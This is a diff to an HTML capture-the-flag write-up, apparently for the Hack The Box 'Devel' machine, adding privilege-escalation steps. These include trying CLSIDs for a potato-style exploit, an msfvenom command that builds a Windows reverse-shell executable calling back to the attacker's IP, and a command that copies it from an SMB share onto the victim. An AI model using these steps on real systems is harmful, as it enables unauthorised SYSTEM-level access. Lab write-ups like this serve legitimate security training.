@@ -123,10 +123,32 @@ layout: default
     <br>
     <br>
 
-    <li>There is a script that will automate the process of trying CLSID's for us, but this is not necessary on this box.  I simply choose the CLSID for the ShellHWDetection, the top one on the list.  This has a CLSID of {555F3418-D99E-4E51-800A-6E89CFD8B1D7}.</li>
+    <li>There is a script that will automate the process of trying CLSID's for us, but this is not necessary on this box.  I simply try the first few on the list manually.  I begin with ShellHWDetection, since it is on the top of the list.  The CLSID for this one is {555F3418-D99E-4E51-800A-6E89CFD8B1D7}.  So I give it a try.</li>
+
+    <img src="../images/devel/jp2.png">
+
+    <br>
+    <br>
+
+    <li>That CLSID did not work either.  So move to the next one in the list.  BITS with a CLSID of {03ca98d6-ff5d-49b8-abc6-03dd84127020}</li>
+
+    <img src="../images/devel/jp3.png">
+
+    <br>
+    <br>
+
+    <li>According to the exploit output it is execution commands succcessfuly as "NT AUTHORITY\SYSTEM".  However, I am not getting a reverse shell using nc.exe for some reason.  Instead, I generate a shell.exe file using msfvenom and transfer that to C:\windows\temp\shell.exe on the victim machine.</li>
+
+    <ul>
+        <li>Creating the shell file.</li>
+            <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f exe &gt; shell.exe&#13;&#10;[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload&#13;&#10;[-] No arch selected, selecting arch: x86 from the payload&#13;&#10;No encoder specified, outputting raw payload&#13;&#10;Payload size: 324 bytes&#13;&#10;Final size of exe file: 73802 bytes&#13;&#10;    </pre>
+            
+        <li>Moving shell.exe to C:\windows\temp\shell.exe</li>
+
+        <pre>&#13;&#10;C:\&gt;&#13;&#10;copy \\10.10.14.83\share\shell.exe C:\windows\temp\shell.exe&#13;&#10;copy \\10.10.14.83\share\shell.exe C:\windows\temp\shell.exe&#13;&#10;        1 file(s) copied.&#13;&#10;        </pre>
+    </ul>
 
     
-
 </body>
 
 </html>
